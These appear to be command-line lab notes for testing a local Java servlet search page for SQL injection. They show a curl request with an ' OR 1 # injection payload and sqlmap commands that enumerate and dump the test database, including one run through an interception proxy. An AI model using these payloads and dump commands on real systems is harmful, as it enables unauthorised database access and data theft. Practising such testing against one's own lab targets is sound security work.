...
$ curl -i "http://localhost:8080/Servlet-Search/controller?username=bart&action=Search"
...
$ curl -i "http://localhost:8080/Servlet-Search/controller?username=%27+OR+1+%23&action=Search"
...
$ sqlmap -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search"
		
$ sqlmap -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" --tables
		
$ sqlmap -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --columns

$ sqlmap -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --schema

$ sqlmap -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --count

$ sqlmap -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump

If we need want to use an interception proxy, we type:

$ sqlmap --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
